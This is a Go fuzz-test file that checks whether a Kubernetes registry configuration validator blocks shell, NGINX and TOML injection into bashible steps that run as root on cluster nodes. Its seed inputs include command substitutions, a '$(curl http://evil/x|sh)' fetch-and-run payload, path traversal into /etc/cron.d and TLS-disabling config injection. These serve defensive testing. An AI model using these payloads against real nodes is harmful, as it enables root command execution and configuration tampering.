/*
Copyright 2026 Flant JSC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

	http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

// Fuzz harnesses for the bashible configuration model.
//
// This model is the payload of the d8-system/registry-bashible-config secret. Its
// values are consumed by bashible steps that run as root on every cluster node and
// are interpolated into two sinks that perform no escaping of their own:
//
//   - candi/bashible/common-steps/all/001_configure_registry_proxy.sh.tpl writes
//     `server {{ $proxy_endpoint }};` into the NGINX configuration of the node
//     load balancer, inside an *unquoted* heredoc (`bb-sync-file ... - << EOF`).
//     The heredoc therefore also performs shell parameter and command
//     substitution on the value.
//
//   - candi/bashible/common-steps/all/030_configure_containerd_registry.sh.tpl
//     interpolates the `hosts` keys and the mirror `host`/`scheme` values into
//     directory paths and into an unquoted heredoc producing hosts.toml. The
//     sprig `quote` used there is Go-style quoting, which escapes `"` and `\` but
//     leaves `$` and backticks to be expanded by the shell.
//
// Threat model coverage (registry-threat-model.md): TM-17, TM-18.
//
// The oracle is: whatever Validate() accepts must be safe for those sinks. The
// module only ever intends to put `<ip>:<port>` into ProxyEndpoints and registry
// hostnames into Hosts, so anything Validate() lets through that cannot be
// interpolated safely is a gap in the model's validation.
//
// The heredocs cannot be quoted shut, which is what makes validation the whole
// defence. In Proxy and Local mode dhctl does not know the node's own address
// and writes helpers.NodeIPPlaceholder in its place, and it is the shell
// expanding that unquoted body which resolves it. So exactly one value carrying
// a shell metacharacter has to be admitted; withoutNodeIPPlaceholder below
// removes that literal and holds everything else to the full predicate.
package bashible

import (
	"encoding/json"
	"fmt"
	"net"
	"strconv"
	"strings"
	"testing"

	"github.com/deckhouse/deckhouse/go_lib/registry/helpers"
)

// shellMetaCharacters are expanded by bash inside an unquoted heredoc body even
// when the value itself is wrapped in Go-style quotes.
const shellMetaCharacters = "$`\\"

// nginxMetaCharacters terminate or open an NGINX directive or block.
const nginxMetaCharacters = ";{}#'\" \t\r\n"

// ---------------------------------------------------------------------------
// Safety predicates.
// ---------------------------------------------------------------------------

// assertShellSafe fails if value could influence a shell command when
// interpolated into an unquoted heredoc body.
func assertShellSafe(t *testing.T, field, value string) {
	t.Helper()

	value = withoutNodeIPPlaceholder(value)

	if i := strings.IndexAny(value, shellMetaCharacters); i >= 0 {
		t.Fatalf("%s = %q was accepted by Validate() but contains the shell metacharacter %q "+
			"at offset %d; it is interpolated into an unquoted heredoc executed as root on every node",
			field, value, value[i], i)
	}
	if strings.ContainsAny(value, "\n\r") {
		t.Fatalf("%s = %q was accepted by Validate() but contains a line break, "+
			"which lets it add lines to a generated configuration file", field, value)
	}
}

// assertNGINXDirectiveSafe fails if value could add or terminate an NGINX
// directive when interpolated as `server <value>;`.
func assertNGINXDirectiveSafe(t *testing.T, field, value string) {
	t.Helper()

	value = withoutNodeIPPlaceholder(value)

	if i := strings.IndexAny(value, nginxMetaCharacters); i >= 0 {
		t.Fatalf("%s = %q was accepted by Validate() but contains the NGINX metacharacter %q "+
			"at offset %d; it is interpolated as `server <value>;` into the node load balancer configuration",
			field, value, value[i], i)
	}
}

// assertHostPort fails unless value is the `<host>:<port>` form the module
// intends to generate for a proxy endpoint.
func assertHostPort(t *testing.T, field, value string) {
	t.Helper()

	host, port, err := net.SplitHostPort(value)
	if err != nil {
		t.Fatalf("%s = %q was accepted by Validate() but is not a host:port pair: %v", field, value, err)
	}
	if net.ParseIP(host) == nil && host != helpers.NodeIPPlaceholder {
		t.Fatalf("%s = %q was accepted by Validate() but %q is neither an IP address nor the "+
			"bootstrap placeholder %s; proxy endpoints are built from "+
			"Node.status.addresses[type=InternalIP], or from that placeholder before the node "+
			"knows its own address", field, value, host, helpers.NodeIPPlaceholder)
	}
	number, err := strconv.Atoi(port)
	if err != nil || number < 1 || number > 65535 {
		t.Fatalf("%s = %q was accepted by Validate() but %q is not a valid TCP port", field, value, port)
	}
}

// withoutNodeIPPlaceholder removes every occurrence of the one literal the
// bashible steps are meant to expand, so that the safety predicates judge what
// is left.
//
// The steps write their files through an unquoted heredoc, because that is what
// resolves ${discovered_node_ip} into the node's own address (see
// helpers.NodeIPPlaceholder). Expansion is therefore not something validation
// can forbid outright -- it can only bound which expansion is possible. Removing
// the exact literal and holding the remainder to the full predicate is that
// bound: "${discovered_node_ip}:5001" reduces to ":5001" and passes, while
// "${discovered_node_ip}$(id)" reduces to "$(id)" and still fails, as does any
// near-miss such as "${discovered_node_ip:-$(id)}".
func withoutNodeIPPlaceholder(value string) string {
	return strings.ReplaceAll(value, helpers.NodeIPPlaceholder, "")
}

// validFuzzContext returns a Context that passes Validate(), so that a fuzz target
// can vary a single field and attribute any rejection to that field.
func validFuzzContext() Context {
	return Context{
		RegistryModuleEnable: true,
		Mode:                 "Proxy",
		Version:              "0000000000000000000000000000000000000000000000000000000000000000",
		ImagesBase:           "registry.d8-system.svc:5001/system/deckhouse",
		Hosts: map[string]ContextHosts{
			"registry.d8-system.svc:5001": {
				Mirrors: []ContextMirrorHost{{
					Host:   "127.0.0.1:5001",
					Scheme: "https",
				}},
			},
		},
	}
}

// ---------------------------------------------------------------------------
// TM-17: proxyEndpoints -> NGINX configuration of the node load balancer.
// ---------------------------------------------------------------------------

func FuzzContextProxyEndpoints(f *testing.F) {
	// The pair the module generates, then one endpoint at a time replaced by a
	// value aimed at a sink: an NGINX directive or block, a comment, a shell
	// substitution, a line break, the bootstrap placeholder and its near misses.
	f.Add("10.0.0.1:5001", "10.0.0.2:5001")
	f.Add("[fd00::1]:5001", "[fd00::2]:5001")
	f.Add("", "10.0.0.2:5001")
	f.Add("10.0.0.1", "10.0.0.2:5001")
	f.Add(":5001", "10.0.0.2:5001")
	f.Add("10.0.0.1:5001; return 200", "10.0.0.2:5001")
	f.Add("10.0.0.1:5001;}\nserver { listen 127.0.0.1:5002; }", "10.0.0.2:5001")
	f.Add("10.0.0.1:5001 # comment", "10.0.0.2:5001")
	f.Add("$(id > /tmp/pwned)", "10.0.0.2:5001")
	f.Add("`id`", "10.0.0.2:5001")
	f.Add("${IFS}", "10.0.0.2:5001")
	f.Add("10.0.0.1:5001$(curl http://evil/x|sh)", "10.0.0.2:5001")
	f.Add("\\", "10.0.0.2:5001")
	f.Add(helpers.NodeIPPlaceholder+":5001", "10.0.0.2:5001")
	f.Add(helpers.NodeIPPlaceholder, "10.0.0.2:5001")
	f.Add("${discovered_node_ip:-$(id)}:5001", "10.0.0.2:5001")
	f.Add("10.0.0.1:5001", "$(id)")
	f.Add("10.0.0.1:5001", "10.0.0.2:99999")
	f.Add("10.0.0.1:5001", "evil.example.com:5001")
	f.Add("10.0.0.1:5001", "\x00")

	f.Fuzz(func(t *testing.T, first, second string) {
		ctx := validFuzzContext()
		ctx.ProxyEndpoints = []string{first, second}

		if err := ctx.Validate(); err != nil {
			// Rejected: nothing reaches the node.
			return
		}

		for i, endpoint := range ctx.ProxyEndpoints {
			field := fmt.Sprintf("proxyEndpoints[%d]", i)
			assertShellSafe(t, field, endpoint)
			assertNGINXDirectiveSafe(t, field, endpoint)
			assertHostPort(t, field, endpoint)
		}
	})
}

// ---------------------------------------------------------------------------
// TM-18: hosts / mirrors -> containerd registry.d layout and hosts.toml.
// ---------------------------------------------------------------------------

func FuzzContextHosts(f *testing.F) {
	// The triple the module generates, then each of the three replaced in turn.
	// The hosts key becomes a directory name under /etc/containerd/registry.d,
	// the mirror host a table key in hosts.toml, and the scheme selects TLS
	// handling -- so each has a different sink and its own payloads.
	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "https")
	f.Add("registry.example.com", "10.0.0.1:5001", "http")
	f.Add("", "127.0.0.1:5001", "https")
	f.Add("../../../etc/cron.d/x", "127.0.0.1:5001", "https")
	f.Add("a/../../b", "127.0.0.1:5001", "https")
	f.Add("$(id > /tmp/pwned)", "127.0.0.1:5001", "https")
	f.Add("`id`", "127.0.0.1:5001", "https")
	f.Add("registry.d8-system.svc:5001 # comment", "127.0.0.1:5001", "https")
	f.Add("registry.d8-system.svc:99999", "127.0.0.1:5001", "https")
	f.Add("\x00", "127.0.0.1:5001", "https")
	f.Add("registry.d8-system.svc:5001", "", "https")
	f.Add("registry.d8-system.svc:5001", "$(id)", "https")
	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001\"]\n[host.\"http://evil\"", "https")
	f.Add("registry.d8-system.svc:5001", helpers.NodeIPPlaceholder+":5001", "https")
	f.Add("registry.d8-system.svc:5001", helpers.NodeIPPlaceholder, "https")
	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "")
	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "HTTPS")
	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "ftp")
	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "https\nskip_verify = true")
	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "$(id)")

	f.Fuzz(func(t *testing.T, hostName, mirrorHost, mirrorScheme string) {
		ctx := validFuzzContext()
		ctx.Hosts = map[string]ContextHosts{
			hostName: {
				Mirrors: []ContextMirrorHost{{
					Host:   mirrorHost,
					Scheme: mirrorScheme,
				}},
			},
		}

		if err := ctx.Validate(); err != nil {
			return
		}

		for name, host := range ctx.Hosts {
			// The key becomes a directory name under /etc/containerd/registry.d and
			// is interpolated into `mkdir -p "…/{{ $host_name }}"`.
			assertShellSafe(t, "hosts key", name)
			if strings.Contains(name, "/") {
				t.Fatalf("hosts key = %q was accepted by Validate() but contains %q, "+
					"which escapes the /etc/containerd/registry.d directory it names", name, "/")
			}

			for i, mirror := range host.Mirrors {
				assertShellSafe(t, fmt.Sprintf("hosts[%q].mirrors[%d].host", name, i), mirror.Host)
				assertShellSafe(t, fmt.Sprintf("hosts[%q].mirrors[%d].scheme", name, i), mirror.Scheme)

				// The scheme selects skip_verify / ca handling in hosts.toml, so only
				// the two schemes the templates branch on may be accepted.
				if mirror.Scheme != "http" && mirror.Scheme != "https" {
					t.Fatalf("hosts[%q].mirrors[%d].scheme = %q was accepted by Validate() but is neither http nor https",
						name, i, mirror.Scheme)
				}
			}
		}
	})
}

// ---------------------------------------------------------------------------
// Robustness of parsing and of the transformations applied to the secret payload.
// ---------------------------------------------------------------------------

// FuzzConfigJSONRoundTrip feeds arbitrary JSON as the secret payload and drives
// the whole chain the orchestrator hooks use: decode, validate, convert to a
// bashible context and flatten it for the template. None of it may panic, and a
// config that validates must still validate after the conversion.
func FuzzConfigJSONRoundTrip(f *testing.F) {
	// The secret's payload as the module writes it, then documents that are not
	// that: absent, the wrong JSON type, fields of the wrong type, duplicates,
	// and values aimed at the sinks the model guards.
	f.Add([]byte(`{"mode":"Proxy","version":"v1","imagesBase":"registry.d8-system.svc:5001/system/deckhouse",` +
		`"proxyEndpoints":["10.0.0.1:5001"],"hosts":{"registry.d8-system.svc:5001":` +
		`{"mirrors":[{"host":"127.0.0.1:5001","scheme":"https"}]}}}`))
	f.Add([]byte(`{}`))
	f.Add([]byte(`null`))
	f.Add([]byte(`[]`))
	f.Add([]byte(``))
	f.Add([]byte(`{`))
	f.Add([]byte(`{"mode":123}`))
	f.Add([]byte(`{"mode":"Proxy"}`))
	f.Add([]byte(`{"proxyEndpoints":"not-a-list"}`))
	f.Add([]byte(`{"proxyEndpoints":[]}`))
	f.Add([]byte(`{"proxyEndpoints":[""]}`))
	f.Add([]byte(`{"proxyEndpoints":["$(id)"]}`))
	f.Add([]byte(`{"proxyEndpoints":["10.0.0.1:5001","10.0.0.1:5001"]}`))
	f.Add([]byte(`{"hosts":{}}`))
	f.Add([]byte(`{"hosts":{"":{"mirrors":[]}}}`))
	f.Add([]byte(`{"hosts":{"a":{"mirrors":[]}}}`))
	f.Add([]byte(`{"hosts":{"a":{"mirrors":[{"host":"h","scheme":"https"},{"host":"h","scheme":"https"}]}}}`))
	f.Add([]byte(`{"hosts":{"a":{"mirrors":[{"host":"h","scheme":"https","rewrites":[{"from":"a","to":"b"}]}]}}}`))
	f.Add([]byte(`{"hosts":{"../../etc":{"mirrors":[{"host":"h","scheme":"https"}]}}}`))
	f.Add([]byte(`{"MODE":"Proxy","PROXYENDPOINTS":["10.0.0.1:5001"]}`))

	f.Fuzz(func(t *testing.T, raw []byte) {
		var config Config
		if err := json.Unmarshal(raw, &config); err != nil {
			return
		}

		validationErr := config.Validate()

		ctx := config.ToContext()
		contextErr := ctx.Validate()

		// ToContext is a field-for-field copy, so it must not change the verdict.
		if (validationErr == nil) != (contextErr == nil) {
			t.Fatalf("ToContext changed the validation verdict: config=%v context=%v\ninput: %s",
				validationErr, contextErr, raw)
		}

		flattened := ctx.ToMap()

		// ToMap feeds the bashible template, so the fields the steps branch on must
		// survive it with their type intact.
		if got, ok := flattened["mode"].(string); !ok || got != config.Mode {
			t.Fatalf("ToMap lost mode: got %#v want %q", flattened["mode"], config.Mode)
		}
		if _, ok := flattened["proxyEndpoints"].([]any); !ok {
			t.Fatalf("ToMap lost proxyEndpoints: got %#v", flattened["proxyEndpoints"])
		}
		if _, ok := flattened["hosts"].(map[string]any); !ok {
			t.Fatalf("ToMap lost hosts: got %#v", flattened["hosts"])
		}

		// The flattened form must be serialisable: the hook stores it in a secret.
		if _, err := json.Marshal(flattened); err != nil {
			t.Fatalf("flattened context cannot be serialised: %v\ninput: %s", err, raw)
		}
	})
}
